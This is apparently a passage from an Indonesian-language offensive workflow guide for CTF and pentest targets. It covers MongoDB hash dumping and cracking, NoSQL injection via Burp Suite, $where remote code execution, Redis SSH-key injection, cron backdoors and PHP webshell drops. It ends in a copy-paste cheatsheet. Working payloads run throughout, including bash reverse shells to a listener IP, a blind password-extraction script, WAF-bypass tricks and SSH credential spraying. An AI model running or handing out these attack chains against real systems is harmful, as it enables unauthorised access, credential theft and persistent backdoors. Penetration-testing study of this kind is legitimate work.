# → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a> untuk full workflow
```

---

### Langkah 5.5 — Extract & Crack MongoDB Hashes

```bash
# Dump system user hashes
mongosh "$MONGO_URI/admin" --eval "db.system.users.find().pretty()" --quiet \
    | tee ~/redis_mongo_loot/mongo/system_users_raw.txt

# Crack dengan hashcat
# MongoDB SCRAM-SHA-256 (mode 24100)
hashcat -m 24100 ~/redis_mongo_loot/mongo/system_users_raw.txt \
    /usr/share/wordlists/rockyou.txt --force

# MongoDB SCRAM-SHA-1 untuk versi lama (mode 24200)
hashcat -m 24200 ~/redis_mongo_loot/mongo/system_users_raw.txt \
    /usr/share/wordlists/rockyou.txt --force
```

**OUTPUT BERHASIL ✅ — Hash cracked:**

```text
$scram$...:password123
```

---

## ═══════════════════════════════════════

## FASE 6: NOSQL INJECTION VIA BURP SUITE

## ═══════════════════════════════════════

> **Scenario:** Web app menggunakan MongoDB tanpa sanitasi → NoSQL Injection via Burp Suite lebih efektif dan visual dibanding terminal karena bisa intercept, modify, dan replay request dengan mudah.

---

### Langkah 6.1 — Setup Burp Suite untuk NoSQL Injection

```bash
# STEP 1: Pastikan Burp Suite proxy aktif (default: 127.0.0.1:8080)
# STEP 2: Set browser proxy ke 127.0.0.1:8080
# STEP 3: Install Burp CA certificate di browser (untuk HTTPS)

# Alternatif: gunakan curl dengan proxy Burp untuk verifikasi
curl -X POST "http://$TARGET/login" \
    -d "username=admin&password=test" \
    --proxy http://127.0.0.1:8080
```

**OUTPUT BERHASIL ✅ — Request tertangkap di Burp:**

```text
POST /login HTTP/1.1
Host: 10.10.11.200
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

➡️ Lanjut ke Langkah 6.2

**OUTPUT GAGAL ❌ — Request tidak tertangkap:**

```text
(tidak ada request di Burp Proxy > Intercept)
```

➡️ Cek:

- Intercept diaktifkan: **Burp > Proxy > Intercept > "Intercept is on"**
- Browser proxy sudah diset ke `127.0.0.1:8080`
- Untuk HTTPS: install CA cert di browser dari `http://burpsuite/`

---

### Langkah 6.2 — Identifikasi Endpoint & Intercept Request

```bash
# Dari terminal — identifikasi endpoint login dulu
curl -s "http://$TARGET/" | grep -iE "form|action|login|api"
curl -s "http://$TARGET/login" | grep -iE "method|action|name="

# Identify apakah JSON atau form-encoded
curl -v -X POST "http://$TARGET/login" \
    -d "username=test&password=test" \
    --proxy http://127.0.0.1:8080 2>&1 | grep "Content-Type"
```

**OUTPUT BERHASIL ✅ — Form login ditemukan:**

```html
<form method="POST" action="/login">
    <input type="text" name="username">
    <input type="password" name="password">
</form>
```

➡️ Form encoded (application/x-www-form-urlencoded) → Ke **Langkah 6.3A**

**OUTPUT BERHASIL ✅ — API JSON ditemukan:**

```html
fetch('/api/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username, password}) })
```

➡️ JSON body → Ke **Langkah 6.3B**

---

### Langkah 6.3A — NoSQL Injection via Burp (Form-Encoded / URL Parameter)

> **Cara kerja:** Di Burp Proxy > Intercept, tangkap request login normal, lalu **klik kanan > Send to Repeater** untuk modifikasi berulang.

**STEP 1: Tangkap request normal di Burp Intercept**

```text
POST /login HTTP/1.1
Host: 10.10.11.200
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=test
```

**STEP 2: Send to Repeater (Ctrl+R)**

**STEP 3: Di Repeater, modifikasi body — coba payload satu per satu:**

```text
# Payload 1: $ne (not equal) — paling umum
username=admin&password[$ne]=wrong

# Payload 2: $gt (greater than)
username=admin&password[$gt]=

# Payload 3: $regex (match anything)
username=admin&password[$regex]=.*

# Payload 4: Bypass username juga
username[$ne]=x&password[$ne]=x

# Payload 5: $exists
username=admin&password[$exists]=true

# Payload 6: Array bypass
username=admin&password[$in][]=admin&password[$in][]=password123
```

**OUTPUT BERHASIL ✅ — Response berbeda dari login normal:**

Sebelum injection:

```text
HTTP/1.1 401 Unauthorized
{"error":"Invalid credentials"}
```

Setelah injection dengan `password[$ne]=wrong`:

```text
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJhbGciOiJIUzI1NiIs...

atau:

HTTP/1.1 200 OK
{"success":true,"token":"eyJhbGciOiJIUzI1NiIs...","user":"admin"}
```

➡️ **AUTH BYPASS BERHASIL!** Catat token/session:

```bash
export SESSION_TOKEN="eyJhbGciOiJIUzI1NiIs..."

# Gunakan token untuk request berikutnya
curl -H "Authorization: Bearer $SESSION_TOKEN" "http://$TARGET/admin/"
curl -H "Cookie: session=$SESSION_TOKEN" "http://$TARGET/admin/"
```

**OUTPUT BERHASIL ✅ — Response berubah tapi bukan sukses:**

```text
HTTP/1.1 200 OK
{"error":"Username not found"}   ← berbeda dari "Invalid credentials"!
```

➡️ Ini tanda injection **BEKERJA SEBAGIAN** — field password dibypass tapi username salah. Coba variasi username:

```text
# Di Burp Repeater:
username[$ne]=nonexistent&password[$ne]=wrong
```

**OUTPUT GAGAL ❌ — Response sama persis:**

```text
HTTP/1.1 401 Unauthorized
{"error":"Invalid credentials"}
```

➡️ Kemungkinan sanitasi berjalan. Coba:

**Di Burp Repeater, ubah Content-Type header:**

```text
# Dari:
Content-Type: application/x-www-form-urlencoded

# Ke:
Content-Type: application/json
```

**Dan ubah body ke JSON:**

```json
{"username":"admin","password":{"$ne":"wrong"}}
```

---

### Langkah 6.3B — NoSQL Injection via Burp (JSON Body)

> **Ini adalah metode paling efektif untuk modern web app yang pakai API.**

**STEP 1: Tangkap request JSON normal di Burp Intercept**

```text
POST /api/login HTTP/1.1
Host: 10.10.11.200
Content-Type: application/json
Content-Length: 42

{"username":"admin","password":"wrongpass"}
```

**STEP 2: Send to Repeater (Ctrl+R)**

**STEP 3: Di Repeater Tab, modifikasi JSON body:**

```json
// Payload 1: $ne — COBA INI DULU
{"username":"admin","password":{"$ne":""}}

// Payload 2: Bypass kedua field sekaligus
{"username":{"$ne":"nonexistent"},"password":{"$ne":"nonexistent"}}

// Payload 3: $gt
{"username":"admin","password":{"$gt":""}}

// Payload 4: $exists
{"username":{"$exists":true},"password":{"$exists":true}}

// Payload 5: $or untuk enumerate
{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$ne":""}}

// Payload 6: $in untuk multiple tries
{"username":"admin","password":{"$in":["admin","password","admin123",""]}}

// Payload 7: $regex
{"username":"admin","password":{"$regex":".*"}}

// Payload 8: $where (versi lama MongoDB saja)
{"username":"admin","$where":"function(){return true;}"}
```

**Di Burp Repeater — cara memodifikasi:**

1. Klik di area body (bawah)
2. Hapus `"wrongpass"`
3. Ganti dengan `{"$ne":""}`
4. Klik **Send**
5. Bandingkan response

**OUTPUT BERHASIL ✅ — JSON injection berhasil:**

```text
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": 1,
    "username": "admin",
    "role": "administrator"
  }
}
```

➡️ **AUTH BYPASS BERHASIL!**

```bash
# Gunakan token
export JWT_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
curl -H "Authorization: Bearer $JWT_TOKEN" "http://$TARGET/api/admin/users"

# → Jika JWT, decode dulu: lihat <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>
# → Jika ada file upload: lihat <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>
```

**OUTPUT GAGAL ❌ — Server error:**

```text
HTTP/1.1 500 Internal Server Error
{"error":"Internal Server Error"}
```

➡️ Server crash karena injection! Tanda vulnerability ada tapi payload salah. Coba:

```json
// Lebih gentle:
{"username":"admin","password":{"$gt":"a"}}
```

**OUTPUT GAGAL ❌ — WAF detected:**

```text
HTTP/1.1 403 Forbidden
{"error":"Request blocked by security policy"}
```

➡️ Ada WAF. Coba bypass di Burp:

**Teknik 1: URL encode payload di Burp:**  
Klik kanan pada `$ne` di body → **Convert Selection > URL Encode**

```text
%24ne  (untuk $ne)
%24gt  (untuk $gt)
```

**Teknik 2: Ubah Content-Type di Burp:**

```text
Content-Type: application/json;charset=UTF-8
Content-Type: application/json; charset=utf-8
Content-Type: text/json
```

**Teknik 3: Tambah/hapus whitespace:**

```json
{  "username"  :  "admin"  ,  "password"  :  {  "$ne"  :  ""  }  }
```

---

### Langkah 6.4 — Burp Intruder untuk Enumerate Data (NoSQL Blind Injection)

> **Scenario:** Login bypass berhasil tapi tidak bisa langsung lihat data. Gunakan Burp Intruder untuk extract data karakter per karakter.

**STEP 1: Identifikasi response perbedaan (true vs false)**

```json
// TRUE condition (user ada):
{"username":"admin","password":{"$ne":""}}
// Response: 200 OK dengan token

// FALSE condition (user tidak ada):
{"username":"NONEXISTENT_USER_XYZ","password":{"$ne":""}}
// Response: 401 atau {"error":"User not found"}
```

**STEP 2: Gunakan $regex untuk extract password karakter per karakter**

Di Burp Repeater, test payload regex:

```json
// Cek apakah password admin diawali dengan 'a':
{"username":"admin","password":{"$regex":"^a"}}

// Cek apakah password admin diawali dengan 'b':
{"username":"admin","password":{"$regex":"^b"}}

// Automasi dengan Burp Intruder:
// Body: {"username":"admin","password":{"$regex":"^§a§"}}
// § § = injection point untuk Intruder
```

**STEP 3: Setup Burp Intruder**

1. Di Repeater, klik kanan → **Send to Intruder**
2. Tab **Positions**: Highlight `a` dalam `"^a"`, klik **Add §**
3. Tab **Payloads**:
    - Payload type: **Simple list**
    - Tambahkan: `a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 ! @ # $ % & *`
4. Tab **Settings** > **Grep - Match**: tambahkan kata dari response sukses (misal: `"token"` atau `"success":true`)
5. Klik **Start attack**

**OUTPUT BERHASIL ✅ — Intruder menemukan karakter:**

```text
Payload: 'a'  → Response length: 287 (berbeda!)  ← Password dimulai 'a'
Payload: 'b'  → Response length: 156 (sama)
Payload: 'c'  → Response length: 156 (sama)
...
```

➡️ Iterasi untuk karakter berikutnya:

```json
// Setelah tahu karakter pertama 'a', cari karakter kedua:
{"username":"admin","password":{"$regex":"^ad"}}
{"username":"admin","password":{"$regex":"^ae"}}
// dst...
```

**Atau automasi dengan Python:**

```python
#!/usr/bin/env python3
import requests
import string

TARGET = "http://10.10.11.200"
CHARSET = string.ascii_lowercase + string.digits + string.punctuation

password = ""
while True:
    found = False
    for char in CHARSET:
        test = password + char
        payload = {"username": "admin", "password": {"$regex": f"^{test}"}}
        r = requests.post(f"{TARGET}/api/login", json=payload, timeout=5)
        if r.status_code == 200 and "token" in r.text:
            password = test
            print(f"[+] Found so far: {password}")
            found = True
            break
    if not found:
        print(f"[*] Complete password: {password}")
        break
```

**OUTPUT BERHASIL ✅:**

```text
[+] Found so far: a
[+] Found so far: ad
[+] Found so far: adm
[+] Found so far: admi
[+] Found so far: admin
[+] Found so far: admin1
[+] Found so far: admin12
[+] Found so far: admin123
[*] Complete password: admin123!
```

---

### Langkah 6.5 — Burp untuk Enumerate MongoDB Collections (Data Extraction)

> **Scenario:** Setelah bypass login, explore endpoint lain yang mungkin vulnerable.

**STEP 1: Explore endpoint dengan injection di Burp Repeater**

```json
// Endpoint search/filter yang mungkin vulnerable
GET /api/users?search=admin
GET /api/users?id=1

// Coba inject di parameter search:
GET /api/users?search[$ne]=nonexistent
GET /api/users?username[$regex]=.*

// POST endpoint:
{"search":{"$where":"function(){return true;}"}}
{"filter":{"$ne":null}}
```

**STEP 2: Di Burp Repeater — test parameter injection**

Jika ada endpoint `/api/search`:

```json
// Request normal:
POST /api/search HTTP/1.1
{"query":"laptop"}

// Injection:
{"query":{"$ne":"nonexistent_item_xyz"}}
// Jika return semua data → VULNERABLE!

// Extract user data:
{"$where":"function(){return this.role=='admin';}"}
// Versi lama MongoDB

// Modern MongoDB — gunakan $regex:
{"username":{"$regex":"admin.*"}}
```

**OUTPUT BERHASIL ✅ — Semua data ter-dump:**

```json
HTTP/1.1 200 OK

[
  {"_id":"...","username":"admin","email":"admin@corp.com","role":"administrator"},
  {"_id":"...","username":"john","email":"john@corp.com","role":"user"},
  {"_id":"...","username":"jane","email":"jane@corp.com","role":"user"}
]
```

➡️ Simpan semua data:

```bash
# Simpan dari Burp Response ke file (copy-paste atau)
curl -X POST "http://$TARGET/api/search" \
    -H "Content-Type: application/json" \
    -d '{"query":{"$ne":"xyz"}}' \
    --proxy http://127.0.0.1:8080 \
    > ~/redis_mongo_loot/mongo/dumped_users.json

cat ~/redis_mongo_loot/mongo/dumped_users.json | python3 -m json.tool
```

---

### Langkah 6.6 — $where Injection via Burp (RCE di MongoDB Lama)

> **HANYA untuk MongoDB versi lama** yang masih support `$where`. Deprecated di versi modern tapi masih muncul di CTF.

**STEP 1: Test apakah $where masih bekerja — di Burp Repeater:**

```json
// Test $where basic (time-based detection):
POST /api/search HTTP/1.1
Content-Type: application/json

{"$where":"function(){sleep(3000);return true;}"}
```

Perhatikan **response time** di Burp (pojok kanan bawah Repeater):

- Normal: `< 500ms`
- Dengan sleep(3000): `> 3000ms` → **$where WORKS = RCE confirmed!**

**STEP 2: Command execution via $where di Burp Repeater:**

```json
// Payload RCE via Node.js process (versi lama):
{
  "$where": "function(){return this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()"
}

// Atau via eval:
{
  "username": "admin",
  "$where": "function(){var x=this.constructor.constructor('return process.mainModule');var r=x().require('child_process').execSync('id').toString();return r.length>0;}"
}
```

**Di Burp Repeater:**

1. Paste payload di body
2. Klik **Send**
3. Perhatikan response — jika ada output `uid=...` → RCE!

**OUTPUT BERHASIL ✅ — Command execution:**

```json
HTTP/1.1 200 OK

{
  "result": [
    {"output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
  ]
}
```

**STEP 3: Dari Burp Repeater, trigger reverse shell:**

```bash
# Setup listener dulu di terminal
nc -lvnp $LPORT

# Di Burp Repeater — kirim payload reverse shell:
```

```json
{
  "$where": "function(){return this.constructor.constructor('return process.mainModule.require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\\\"\")')()}"
}
```

**OUTPUT BERHASIL ✅ — Shell di listener:**

```text
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.200 53221
bash: cannot set terminal process group: Inappropriate ioctl
bash: no job control in this shell
www-data@target:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ Shell didapat! Upgrade dan lanjut ke privesc:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

**OUTPUT GAGAL ❌ — $where disabled:**

```json
{"error":"$where is not allowed"}
```

➡️ MongoDB terbaru (5.x+) sudah disable `$where`. Kembali ke Langkah 6.4 dengan metode `$regex` untuk data extraction.

---

### Langkah 6.7 — Burp Scan Otomatis untuk NoSQL Injection

> Gunakan fitur **Burp Scanner** (Burp Pro) atau extension untuk scan otomatis.

**Dengan Burp Pro:**

1. Klik kanan pada request di Proxy History
2. Pilih **Scan** → **Active Scan**
3. Centang **Injection flaws** dan **NoSQL injection**
4. Klik **OK**

**Dengan Extension (Burp Community):**

```bash
# Install extension "NoSQL Scanner" atau "JSON Injector"
# Burp > Extensions > BApp Store > Search "NoSQL"

# Atau manual dengan Burp Intruder + wordlist NoSQL
# Download: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
```

**Wordlist NoSQL payloads untuk Burp Intruder:**

```text
{"$gt":""}
{"$ne":""}
{"$regex":".*"}
{"$exists":true}
{"$where":"1==1"}
{"$in":[""]}
{"$nin":[""]}
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce
```

---

## ═══════════════════════════════════════

## FASE 7: ATTACK CHAINS (CROSS-SERVICE)

## ═══════════════════════════════════════

### Chain 1: Redis → SSH Key → Lateral Movement

```bash
# 1. Redis unauthenticated
redis-cli -h $TARGET PING  # → +PONG

# 2. Cek user yang running Redis
redis-cli -h $TARGET CONFIG GET dir

# 3. Inject SSH key
ssh-keygen -f ~/.ssh/redis_exploit -N ""
redis-cli -h $TARGET FLUSHALL
redis-cli -h $TARGET CONFIG SET dir /home/redis/.ssh/
redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
redis-cli -h $TARGET SET pk "\n\n$(cat ~/.ssh/redis_exploit.pub)\n\n"
redis-cli -h $TARGET SAVE

# 4. SSH login
ssh -i ~/.ssh/redis_exploit redis@$TARGET

# 5. Di dalam shell — cari credential untuk pivot
cat /home/redis/.bash_history  # SERING ADA CREDS DI SINI!
find / -name "*.conf" -readable 2>/dev/null | xargs grep -i password 2>/dev/null

# 6. Cek network untuk lateral movement
ss -tunp; ip route; arp -n
```

### Chain 2: SMB → Creds → Redis Authenticated → Shell

```bash
# 1. Dari SMB loot (file .env yang di-download):
cat ~/smb_loot/files/.env | grep -i redis
# → REDIS_PASSWORD=FoundPassword123
# → REDIS_HOST=10.10.11.200

# 2. Auth ke Redis dengan password yang ditemukan
export REDIS_PASS="FoundPassword123"
redis-cli -h $TARGET -p 6379 -a "$REDIS_PASS" PING
# → PONG

# 3. Lanjutkan dengan SSH injection atau cron backdoor
```

### Chain 3: MongoDB → Credentials → SSH/Web

```bash
# 1. MongoDB unauthenticated
mongosh "mongodb://$TARGET:27017" --eval "show dbs" --quiet

# 2. Dump user credentials
mongosh "mongodb://$TARGET:27017/appdb" \
    --eval "db.users.find({},{username:1,password:1})" --quiet

# 3. Test credentials ke SSH
while IFS=: read user pass; do
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$TARGET" "id" 2>/dev/null \
    && echo "[+] SSH SUCCESS: $user:$pass"
done < ~/redis_mongo_loot/creds/mongo_creds.txt
```

### Chain 4: Web NoSQL Injection via Burp → Admin → File Upload → Shell

```bash
# 1. Bypass login via Burp Repeater:
# Body: {"username":"admin","password":{"$ne":""}}
# → Dapat token/session

# 2. Gunakan session untuk akses admin area
curl -b "session=$SESSION_TOKEN" "http://$TARGET/admin/" \
    | grep -i "upload\|file\|command"

# 3. Jika ada file upload → upload webshell
# → ke <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>

# 4. Jika ada command execution feature → RCE langsung
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`NOAUTH Authentication required`|Redis punya password|Brute force dengan hydra atau cari di `.env`/config|
|`CONFIG SET dir: Permission denied`|User Redis tidak bisa write ke dir|Coba `/tmp/`, `/var/lib/redis/`, atau dir writable lain|
|`SAVE failed after redis db write`|Disk full atau permission denied saat write|`df -h`, ganti direktori|
|`WRONGTYPE Operation`|Key bukan tipe string|Cek `TYPE key_name`, gunakan `HGETALL`/`LRANGE`/`SMEMBERS`|
|`Connection refused`|Redis bind localhost atau protected-mode ON|Tunnel via SSH/LFI, atau cari cara bypass|
|`ERR unknown command 'CONFIG'`|CONFIG command di-disable|Coba Lua RCE atau Module Loading|
|`Permission denied (publickey)`|SSH key injection gagal|Cek permission `.ssh/`, coba path berbeda, pastikan newlines ada|
|`Cron tidak execute`|Format salah, path salah, bukan root|Cek format, coba `/etc/cron.d/`, pastikan Redis root|
|`MongoServerError: command find requires authentication`|MongoDB butuh auth|Login dengan `user:pass@host:port/db`|
|`MongoNetworkError: ECONNREFUSED`|MongoDB tidak jalan atau port blocked|Cek `systemctl status mongodb`, cek firewall|
|`MongoServerError: not authorized`|User tidak punya privilege|Coba database lain, atau user yang lebih tinggi|
|`mongosh: command not found`|Mongosh tidak terinstall|`sudo apt install mongodb-mongosh -y`|
|`NoSQL injection tidak berhasil (form)`|Sanitasi atau WAF|Coba ubah Content-Type ke JSON di Burp, atau encoding berbeda|
|`$where is not allowed`|MongoDB 5.x+ disable `$where`|Gunakan `$ne`, `$regex`, `$gt` operator lain|
|`KEYS * hang`|Terlalu banyak keys|Gunakan `SCAN 0` atau `SCAN 0 MATCH pattern*`|
|`HTTP 403 di Burp`|WAF blocking payload|URL-encode `$` → `%24`, ubah Content-Type, tambah whitespace|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE

## ═══════════════════════════════════════

```text
PORT 6379 (Redis) OPEN
│
├─ redis-cli PING → +PONG?
│   ├─ YES: UNAUTHENTICATED!
│   │   ├─ RECON: CONFIG GET dir, KEYS *
│   │   ├─ Cek user Redis (ps aux / test write ke path)
│   │   ├─ [User = root]    → PATH 2B: Cron Backdoor → ROOT SHELL
│   │   ├─ [User = redis]   → PATH 2A: SSH Key Injection → redis shell
│   │   ├─ [Web server ada] → PATH 2C: Webshell Drop → RCE
│   │   └─ [Keys ada data]  → Baca semua key → Creds / Flag
│   └─ NO: NOAUTH
│       ├─ Brute force hydra / default creds
│       ├─ Cari di .env, config, SMB share
│       └─ [Pass found] → Sama seperti Unauthenticated path
│
PORT 27017 (MongoDB) OPEN
│
├─ mongosh TARGET → Berhasil?
│   ├─ YES: UNAUTHENTICATED!
│   │   ├─ show dbs → list semua database
│   │   ├─ use appdb → show collections → db.collection.find()
│   │   ├─ [Creds di collection]  → Test SSH/Web login
│   │   ├─ [Flag di collection]   → Submit flag!
│   │   └─ [Hash ditemukan]       → Crack dengan hashcat -m 24100
│   └─ NO: Auth required
│       ├─ Default creds / brute force
│       └─ [Creds found] → Sama seperti Unauthenticated path
│
PORT 80/443 + MongoDB/Redis backend
│
└─ Web app menggunakan NoSQL?
    ├─ IDENTIFIKASI: form-encoded atau JSON?
    ├─ BURP INTERCEPT → Send to Repeater
    ├─ TEST payload $ne, $gt, $regex satu per satu
    ├─ [Login bypass]     → Admin access → Cari RCE point (upload/cmd)
    ├─ [$where works]     → RCE via JavaScript execution
    └─ [Blind injection]  → Burp Intruder + $regex → Extract data char by char
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

```bash
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
export REDIS_PASS=""  # Isi jika ada password
mkdir -p ~/redis_mongo_loot/{redis,mongo,creds,keys,burp}

# === REDIS QUICK CHECK ===
redis-cli -h $TARGET PING                          # Unauthenticated?
redis-cli -h $TARGET -a "$REDIS_PASS" PING         # Authenticated?
redis-cli -h $TARGET INFO server                   # Server info
redis-cli -h $TARGET CONFIG GET dir                # Working dir
redis-cli -h $TARGET KEYS "*"                      # All keys

# === REDIS SSH KEY INJECTION ===
ssh-keygen -t rsa -f ~/.ssh/redis_exploit -N ""
redis-cli -h $TARGET FLUSHALL
redis-cli -h $TARGET CONFIG SET dir /home/redis/.ssh/
redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
redis-cli -h $TARGET SET pk "\n\n$(cat ~/.ssh/redis_exploit.pub)\n\n"
redis-cli -h $TARGET SAVE
ssh -i ~/.ssh/redis_exploit redis@$TARGET           # Login

# === REDIS CRON BACKDOOR ===
redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/crontabs/
redis-cli -h $TARGET CONFIG SET dbfilename root
redis-cli -h $TARGET SET cron "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\n\n"
redis-cli -h $TARGET SAVE

# === REDIS WEBSHELL ===
redis-cli -h $TARGET CONFIG SET dir /var/www/html/
redis-cli -h $TARGET CONFIG SET dbfilename shell.php
redis-cli -h $TARGET SET ws "<?php system(\$_GET['cmd']); ?>"
redis-cli -h $TARGET SAVE
curl "http://$TARGET/shell.php?cmd=id"

# === MONGODB QUICK CHECK ===
mongosh "mongodb://$TARGET:27017" --eval "show dbs" --quiet          # Unauth?
mongosh "mongodb://$TARGET:27017" --eval "db.version()" --quiet

# === MONGODB DUMP ALL ===
mongosh "mongodb://$TARGET:27017/appdb" --eval "show collections" --quiet
mongosh "mongodb://$TARGET:27017/appdb" --eval "db.users.find().pretty()" --quiet
mongosh "mongodb://$TARGET:27017/admin" --eval "db.system.users.find().pretty()" --quiet

# === NOSQL INJECTION (URL encoded — terminal) ===
curl -X POST "http://$TARGET/login" -d "username=admin&password[\$ne]=x"
curl -X POST "http://$TARGET/login" -d "username=admin&password[\$gt]="
curl -X POST "http://$TARGET/login" -d "username[\$ne]=x&password[\$ne]=x"

# === NOSQL INJECTION (JSON — terminal) ===
curl -X POST "http://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$ne":""}}'
curl -X POST "http://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}'

# === NOSQL INJECTION (via Burp — copy paste ke Repeater body) ===
# Form-encoded:
# username=admin&password[$ne]=wrong
# username[$ne]=x&password[$ne]=x

# JSON:
# {"username":"admin","password":{"$ne":""}}
# {"username":{"$ne":"x"},"password":{"$ne":"x"}}
# {"username":"admin","password":{"$regex":".*"}}
# {"$where":"function(){sleep(3000);return true;}"}  ← Time-based test

# === HASH CRACKING ===
hashcat -m 24100 mongo_hash.txt /usr/share/wordlists/rockyou.txt  # SCRAM-SHA-256
hashcat -m 24200 mongo_hash.txt /usr/share/wordlists/rockyou.txt  # SCRAM-SHA-1
hydra -P /usr/share/wordlists/rockyou.txt redis://$TARGET:6379    # Redis brute
```

---

> **➡️ NEXT:**
> 
> - **Shell di Linux** → `<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`
> - **Credentials ditemukan** → Test ke semua service, lihat Cross-Service Chart di Fase 4.2
> - **Ada web server** → `<a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>`
> - **Environment AD** → `<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`
> - **JWT token didapat** → `<a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>`
> - **File upload tersedia** → `<a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>`
